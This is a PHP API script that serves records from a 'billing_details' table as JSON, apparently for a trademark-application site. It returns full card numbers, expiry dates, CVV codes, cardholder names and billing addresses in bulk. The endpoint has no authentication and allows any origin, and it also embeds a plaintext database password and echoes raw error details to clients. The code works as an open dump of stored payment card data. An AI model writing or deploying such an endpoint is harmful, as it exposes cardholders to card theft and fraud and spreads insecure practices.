<?php
// Enable errors for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Database configuration - UPDATE THESE!
$host = 'localhost';
$dbname = 'tradfred_atlas_db';
$username = 'tradfred_atlas_user';
$password = 'xb12!!RSxxZx0';

// Test endpoint
if (isset($_GET['test'])) {
    echo json_encode([
        'success' => true, 
        'message' => 'API is working',
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    exit();
}

// Create connection with latin1 charset for MyISAM table
try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=latin1", $username, $password, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES => false,
        PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES latin1"
    ]);
} catch (PDOException $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Database connection failed',
        'details' => $e->getMessage()
    ]);
    exit();
}

// Only handle GET requests
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Only GET method allowed']);
    exit();
}

// Get single record by ID
if (isset($_GET['id'])) {
    $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
    if (!$id) {
        echo json_encode(['success' => false, 'error' => 'Invalid ID']);
        exit();
    }
    
    try {
        $stmt = $pdo->prepare("SELECT * FROM billing_details WHERE id = ?");
        $stmt->execute([$id]);
        $data = $stmt->fetch();
        
        if ($data) {
            // Convert to UTF-8
            $data = array_map(function($value) {
                return is_string($value) ? mb_convert_encoding($value, 'UTF-8', 'ISO-8859-1') : $value;
            }, $data);
            
            echo json_encode(['success' => true, 'data' => $data]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Record not found']);
        }
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'error' => 'Query failed: ' . $e->getMessage()]);
    }
    exit();
}

// Get all records with basic pagination
try {
    // Get pagination parameters
    $page = isset($_GET['page']) ? max(1, (int)$_GET['page']) : 1;
    $limit = isset($_GET['limit']) ? min(100, max(1, (int)$_GET['limit'])) : 20;
    $offset = ($page - 1) * $limit;
    
    // Get total count
    $countStmt = $pdo->query("SELECT COUNT(*) as total FROM billing_details");
    $totalResult = $countStmt->fetch();
    $total = (int)$totalResult['total'];
    
    // Get paginated data - SELECT ALL FIELDS
    $stmt = $pdo->prepare("
        SELECT 
            id,
            trademark_application_id,
            card_number,
            card_expiry,
            card_cvv,
            card_holder_name,
            card_type,
            card_last_four,
            billing_city,
            billing_state,
            billing_zip_code,
            billing_address,
            created_at
        FROM billing_details 
        ORDER BY id DESC 
        LIMIT :limit OFFSET :offset
    ");
    
    $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
    $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
    $stmt->execute();
    
    $data = $stmt->fetchAll();
    
    // Convert all data to UTF-8
    $data = array_map(function($row) {
        return array_map(function($value) {
            if (is_string($value)) {
                return mb_convert_encoding($value, 'UTF-8', 'ISO-8859-1');
            }
            return $value;
        }, $row);
    }, $data);
    
    // Return response with all fields
    $response = [
        'success' => true,
        'data' => $data,
        'pagination' => [
            'page' => $page,
            'limit' => $limit,
            'total' => $total,
            'pages' => $total > 0 ? ceil($total / $limit) : 1
        ],
        'columns' => [
            'id',
            'trademark_application_id',
            'card_number',
            'card_expiry',
            'card_cvv',
            'card_holder_name',
            'card_type',
            'card_last_four',
            'billing_city',
            'billing_state',
            'billing_zip_code',
            'billing_address',
            'created_at'
        ],
        'info' => [
            'table' => 'billing_details',
            'total_records' => $total,
            'fetched_records' => count($data),
            'timestamp' => date('Y-m-d H:i:s')
        ]
    ];
    
    echo json_encode($response, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Failed to fetch data',
        'details' => $e->getMessage()
    ]);
}

exit();
?>